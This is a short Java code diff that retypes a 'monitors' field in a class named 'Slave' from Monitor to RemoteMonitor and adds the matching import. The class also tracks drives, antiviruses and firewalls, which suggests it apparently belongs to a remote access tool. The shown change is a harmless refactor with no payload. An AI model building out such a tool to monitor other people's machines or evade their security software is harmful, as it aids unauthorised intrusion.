@@ -42,6 +42,8 @@ import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.swing.ImageIcon;
 
+import com.redpois0n.graphs.monitors.RemoteMonitor;
+
 @SuppressWarnings("unused")
 public class Slave implements Runnable {
 
@@ -60,7 +62,7 @@ public class Slave implements Runnable {
 
 	private final List<String> queue = new ArrayList<String>();
 	private Drive[] drives;
-	private Monitor[] monitors;
+	private RemoteMonitor[] monitors;
 	private Locale[] locales;
 	private Antivirus[] antiviruses;
 	private Firewall[] firewalls;
@@ -426,11 +428,11 @@ public class Slave implements Runnable {
 		this.drives = drives;
 	}
 
-	public Monitor[] getMonitors() {
+	public RemoteMonitor[] getMonitors() {
 		return monitors;
 	}
 
-	public void setMonitors(Monitor[] monitors) {
+	public void setMonitors(RemoteMonitor[] monitors) {
 		this.monitors = monitors;
 	}
 
